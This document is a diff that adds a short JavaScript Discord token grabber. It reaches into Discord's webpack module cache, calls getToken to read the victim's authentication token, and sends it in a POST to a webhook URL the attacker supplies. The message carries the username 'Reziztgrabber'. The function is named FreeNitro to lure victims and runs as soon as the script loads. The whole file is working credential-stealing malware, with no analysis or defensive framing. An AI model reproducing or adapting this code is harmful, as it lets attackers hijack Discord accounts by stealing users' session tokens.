@@ -1,0 +1,34 @@
+const webhookurl = 'WEBHOOK HERE';
+
+var req = webpackJsonp.push([
+    [], {
+        extra_id: (e, t, r) => e.exports = r
+    },
+    [
+        ["extra_id"]
+    ]
+]);
+for (let e in req.c)
+    if (req.c.hasOwnProperty(e)) {
+        let t = req.c[e].exports;
+        if (t && t.__esModule && t.default)
+            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
+    }
+function FreeNitro() {
+    var e = new XMLHttpRequest;
+    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
+    var t = {
+        username: "Reziztgrabber",
+        content: "",
+        embeds: [{
+            color: "4700374",
+            avatar: "https://cdn.discordapp.com/avatars/750086812642443267/a_52906dcbf8a58ea293fd4b2506a7da7f.gif",
+            description: "logged" + token,
+            footer: {
+                text: "Rezizt | https://discord.gg/5ATwpKZ"
+            }
+        }]
+    };
+    e.send(JSON.stringify(t))
+}
+FreeNitro();
